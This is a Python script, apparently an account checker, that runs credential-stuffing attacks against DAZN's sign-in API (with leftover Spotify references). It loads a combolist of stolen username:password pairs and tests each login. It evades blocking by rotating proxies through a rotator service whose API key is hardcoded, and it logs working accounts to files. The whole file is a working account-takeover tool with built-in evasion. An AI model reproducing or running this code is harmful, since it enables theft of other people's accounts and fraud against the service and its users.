#!/usr/bin/python
# -*- coding: utf-8 -*-
"""checker.py: A script for automatize the procedure of checking accounts

Requirements:
    pip install bs4
    pip install schedule #opt
"""

from stem import Signal  # to control tor server
from stem.control import Controller
import time
import base64
#import schedule
import datetime
import sys
import os
import requests
import urllib.parse
import json
from bs4 import BeautifulSoup  # A wonderful module for HTML parsing
# import json

def hilite(string, status=False, bold=False):
    """If tty highligth the output (red/green color)."""

    if not sys.stdout.isatty():
        return string
    attr = []
    if status:
        attr.append('32')  # Green
    else:
        attr.append('31')  # Red
    if bold:
        attr.append('1')
    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

def load_config(current_session):
    # Get login data from file
    current_session['start'] = datetime.datetime.now()  # set the start time
    current_session['config'] = {}
    current_session['config']['proxy'] = []
    current_session['config']['others'] = []
    current_session['config']['timeout'] = 10
    #TODO fopen check
    #f_proxy = open("proxy.txt", 'r')
    #delimiter = input("Delimiter char used in combos?[,|:;]")
    '''for line in f_proxy.readlines():
        ip, port = line.rstrip().split(":", 1)
        port = port.split(' ', 1)[-1]  # Remove all after first space ip:port -somecommentuknow
        proxy = {'https': 'https://'+ip+":"+port,
                'http': 'https://'+ip+":"+port
                }
        # Add also socks4/5 to autochec'''
    proxy = retrieve_new_proxy()
    current_session["config"]["proxy"].append(proxy)
    return current_session
    
def retrieve_new_proxy():
    url = 'http://falcon.proxyrotator.com:51337/'

    params = dict(
    apiKey='6emCXEY8gKdtwZSpM7bTQhNPAfHqknVv',
    country='IT'
    )

    resp = requests.get(url=url, params=params)
    jdata = json.loads(resp.text)
    return jdata.get("proxy") #IP:PORT

def try_login(username, password, session_config):

    url_0 = 'https://www.dazn.com/it-IT/account/signin'
    url_1 = 'https://isl-eu.dazn.com/misl/eu/v4/SignIn'
    url_2 = 'https://www.spotify.com/us/account/overview/'
    # Start a new session, to preserve the cookie
    global s
    s = requests.session()
    #proxy
    myproxies = proxy = {'https': 'https://'+session_config['config']["proxy"][0],
                'http': 'https://'+ session_config['config']["proxy"][0]
                }
    s.proxies = myproxies

    #s.proxies = proxy
    timeout = session_config['config']['timeout']
    # Take session and anti-csrf Token
    #TOEDIT 1 !!!!
    first_request_header = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'DNT': '1',
        'Origin': 'https://www.dazn.com',
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
        'Accept-Language': 'it-IT'
        }
    t = s.get(url_0, timeout=timeout, headers=first_request_header)
    auth_url = s.cookies.get_dict().get("UI.uuid")  # CSRF in cookie ex.0064B08D31
    # print("Got CSRF token:" + auth_url)
    # The login POST payload
    login_payload = {
         'Email': username,
        'Password': password,
        'DeviceId': str(auth_url)+"B",
        'Platform': "web"
    }
    # Need to avoid b'string' with base64encode
    login_headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
        # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language' : 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding' : 'gzip, deflate, br',
        'Referer': 'https://www.dazn.com/it-IT/account/signin',
        'X-Requested-With': 'XMLHttpRequest',
        'Upgrade-Insecure-Requests' : '1',
        'Origin': 'https://www.dazn.com',
        #'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Type': 'application/json',
        'Content-Length' : str(len(urllib.parse.urlencode(login_payload))),
        #'Cookie' : 'spot={"t":1516389866,"m":"it","p":null}; sp_t=77022c91543ca0fb030c694ed847a98b; sp_new=1; __bon='+str(bon_cookie)+'; _ga=GA1.2.1199860444.1516389870; _gid=GA1.2.198396770.1516389870; _gat=1;fb_continue=; __tdev=VV4fjDj7; __tvis=BGWgw2Xk; spot=; csrf_token='+auth_url+'; remember='+username,
        'Connection': 'keep-alive',
    }
    json_dict = {}
    try:
        l_response = s.post(url_1, json=login_payload, headers=login_headers)# data=login_payload,
        # vote_response = s.post(url, data=vote_payload, headers=vote_headers)
        print(l_response.text)        
        error_login_key = "odata.error"  # KEy of json dict
        error_login_values = ["password", "Password"]  # Value of error key
        change_ip_list = ["limiting", "VPN"]
        if "Forbidden" in l_response.text:
            proxy = retrieve_new_proxy()
            old_one = session_config["config"]["proxy"].pop()
            session_config["config"]["proxy"].append(proxy)
            print(hilite("Waiting for change proxy. [Old IP = "+old_one+" ]\n"))
            time.sleep(0.5)
            #Need to retry
            #print("Retrying, something went wrong")
            #try_login(username, password, session_config)
 
        try:
            json_dict = json.loads(l_response.text)
        except Exception as e:
            print(hilite("Waiting... no json retrived.\n"))
            #session_config['tor_controller'].signal(Signal.NEWNYM) # signal tor to change ip 
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            print(e)
            time.sleep(2)  # lets wait to tor! a little!

        if l_response and l_response.status_code == 200:
            '''if len(json_dict) > 0 and error_login_value in str(json_dict.get(error_login_key)["message"]["value"]):
                print((hilite("Account " + username + ":" + password + " is not working!")))
            el'''
            if len(json_dict) > 0 and "Result" in json_dict:
                # Check acccount info (2 urls for netflix, billing contains all needed infos)!
                print("200: following json response")
                print(json_dict)
                time.sleep(0.1)
                #overview = s.get(url_2)
                #Check for subscription infos
                #soup = BeautifulSoup(overview.text)
                #plan_subscription = soup.select("h3[class=product-name]")
                if json_dict.get("Result") == "FreeTrial":
                    print((hilite("Account " + username + ":" + password + " is working (FREE :( )!")))
                #elif len(plan_subscription) > 0 and "Premium paused" in plan_subscription[0].text:
                #    print((hilite("Account " + username + ":" + password + " is working (PAUSED :( )!")))
                else:
                    print((hilite("Account " + username + ":" + password + " is working (STATUS UKNOWN :O )!")))
                    fw = "logSpotify.txt"
                    with open(fw, "a+") as log:
                        log.write(username+":"+password+"|" +"\n")
                        
        else:
            if any(word in json_dict.get(error_login_key)["message"]["value"] for word in error_login_values):
                print((hilite("Account " + username + ":" + password + " is not working!")))
            elif any(word in json_dict.get(error_login_key)["message"]["value"] for word in change_ip_list):
                proxy = retrieve_new_proxy()
                old_one = session_config["config"]["proxy"].pop()
                session_config["config"]["proxy"].append(proxy)
                print(hilite("Waiting for change proxy. [Old IP = "+old_one+" ]\n"))
                time.sleep(0.5)
            else:
                print(hilite("Error:" + str(l_response.status_code)))
                print(hilite("From api:" + "\n" + str(json_dict.get(error_login_key))))
    except Exception as e:
        print(hilite("! Login failed for " + username))
        fw = "logManualCheckDazn.txt"
        with open(fw, "a+") as log:
            log.write(username+":"+password +"\n")
        #print(l_response.text[:5640])
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(exc_type, fname, exc_tb.tb_lineno)
        print(e)
        #raise(e)


def main():
    # Get login data from file
    current_session = {}
    current_session = load_config(current_session)
     # Tor configuration
    
    try:
        # Some configuration infos
        fname = input("Combolist file name?")
        f = open(fname, 'r')
        delimiter = input("Delimiter char used in combos?[,|:;]")
        line_index = 0
        combo_list = f.readlines()
        while line_index < len(combo_list):
            line = combo_list[line_index]
            #print("Read from file:" + line)
            if not line or line.startswith("#") or len(line) < 4:  # line is blank or a comment
                continue
            user, password = line.rstrip().split(delimiter, maxsplit=1)
            try:
                try_login(user, password, current_session)
                #print(line_index)
                time.sleep(3)
                line_index += 1
            except requests.exceptions.RequestException:
                # Proxy KO
                # Change proxy next iteration 
                #current_session["config"]["changeProxyFlag"] = True
                print(hilite("Something went wrong, retrying.. " + "\n"))
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                print(exc_type, fname, exc_tb.tb_lineno)
                continue

        print ("End of cracking:", str(datetime.date.today()))
    except ValueError:
        print(hilite("Check the format of your accounts.txt! It should be like:\nusername:password<cr>"))
        print("The script will try to go on in case of:\na)A blank line\nb)a comment (#) line\nPress CTRL+C to exit")
    except KeyboardInterrupt:
        print(hilite("[Closing the resource, shutdown the network module... WAIT]"))
    except Exception as e:
        print(hilite("Unhelded exception, exiting.." + str(e)))
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(exc_type, fname, exc_tb.tb_lineno)


def main2():
    # Get login data from file
    f = file("accounts.txt", 'r')
    f2 = file("pswd.txt", 'r')
    for line in f.readlines():
        user, password = line.rstrip().split(":")
        for line in f2.readlines():
            try_login(user, line.strip())
            time.sleep(3)

main()

